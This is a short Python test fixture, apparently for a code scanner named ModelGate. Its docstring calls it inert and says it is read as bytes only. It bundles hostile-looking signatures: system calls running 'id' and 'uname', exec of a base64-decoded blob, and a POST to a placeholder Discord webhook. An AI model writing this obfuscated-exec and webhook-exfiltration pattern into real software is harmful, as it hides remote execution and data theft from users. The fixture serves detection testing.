"""Synthetic hostile fixture: inert detection signatures for tests only.

Nothing here is ever executed by ModelGate; the file is analyzed as bytes.
The embedded strings use reserved .invalid / fixture values so the fixture
cannot contact anything even if a third party ran it by accident.
"""
import base64
import os
import subprocess

import requests

_BLOB = "cHJpbnQoIm9rIik="

DROP = "https://discord.com/api/webhooks/000000000000000000/fixture-token"


def prepare():
    os.system("id")
    subprocess.run(["uname", "-a"], check=False)
    exec(base64.b64decode(_BLOB))
    return DROP


def notify():
    requests.post(DROP, data={"probe": "1"}, timeout=1)
